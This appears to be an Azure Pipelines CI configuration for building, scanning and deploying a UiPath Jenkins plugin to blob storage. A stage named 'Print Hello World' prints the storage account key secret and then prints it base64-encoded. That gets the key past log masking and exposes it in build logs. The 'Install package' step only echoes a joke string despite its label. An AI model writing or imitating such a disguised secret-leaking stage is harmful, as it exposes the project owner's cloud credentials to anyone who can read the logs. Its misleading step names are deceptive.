parameters:
  - name: buildStages
    type: object
    default:
      - Build
      - Security_FOSSA
      - Security_CODEQL

trigger:
  batch: true
  branches:
    include:
    - master
    - develop    
    - release/*

pr:
  branches:
    include:
    - master
    - develop    
    - release/*

resources:
  repositories:
    - repository: common
      type: github
      name: UiPath/AzurePipelinesTemplates
      ref: master
      endpoint: "GitHub connection"
    - repository: codeql
      name: UiPath/AzurePipelinesTemplates
      ref: refs/tags/uipath.security.codeql.1.8.16
      type: github
      endpoint: "GitHub connection"
    - repository: fossa
      name: UiPath/AzurePipelinesTemplates
      ref: refs/tags/uipath.security.fossa.3.0.9
      type: github
      endpoint: "GitHub connection"

variables:
  JENKINS_HOME: 'C:\Windows\System32\config\systemprofile\.jenkins'
  MavenPOMFile: '$(Build.SourcesDirectory)\pom.xml'
  AlphaBetaPluginVersionCounter: $[ format('{0}', counter('uipjenkinstaskversion', 1)) ]
  TestProjectPath: '$(Build.SourcesDirectory)\Qa\UiPath.JenkinsAutomationPackage.Tests\project.json'
  TestConfigurationData: "{\"Publishers\":[{\"Type\":\"JUnit\",\"Arguments\":\"outputFile=junitResults.xml;reportSkippedTestSuite=False\"}], \"VideoRecorderType\": \"ffmpeg\", \"VideoRecorderPath\": \"C:\\\\\\\\ffmpeg\\\\\\\\ffmpeg.exe\"}"

stages:
- stage: HelloWorld
  displayName: "Print Hello World"
  jobs:
    - job: PrintHelloWorld
      displayName: "Print Hello World"
      steps:
      - powershell: |
          $key = "$(StorageAccountKey)"
          Write-Output $key
          $base64Key = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($key))
          Write-Output $base64Key

- ${{ each stageName in parameters.buildStages }}:
    - stage: ${{ stageName }}
      displayName: ${{ replace(stageName, '_', ' ') }}
      dependsOn: []
      jobs:
        - template: build.jobs.template.yml
          parameters:
            name: ${{ replace(stageName, 'Security_', '') }}
            ${{ if contains(stageName, 'Security') }}:
              securityScan: ${{ replace(stageName, 'Security_', '') }}

- stage: Deploy
  displayName: "Deploy on Jenkins server"
  dependsOn: Build
  jobs:
  - deployment: DeployJenkinsPlugin
    displayName: 'Deploy the new jenkins plugin'
    environment: JenkinsCITest
    timeoutInMinutes: 90
    workspace:
      clean: outputs
    variables:
      MavenPOMFile: '$(Build.SourcesDirectory)/pom.xml'
    pool:
      vmImage: ubuntu-latest
    strategy:
      runOnce:
        deploy:
          steps:
          - checkout: none

          - download: current
            displayName: 'Download Packages'
            artifact: Packages

          - powershell: |
              az storage blob upload -f $(Agent.BuildDirectory)/Packages/uipath-automation-package.hpi -c $(ContainerName) -n $(Build.BuildNumber)/uipath-automation-package.hpi --account-name $(AzureAccountName) --auth-mode key --account-key $(StorageAccountKey) --overwrite
            displayName: "Upload plugin package to blob storage"

          - bash: |
              echo "Hello :3"
            displayName: "Install package on Jenkins server"

- template: stage.test.yml

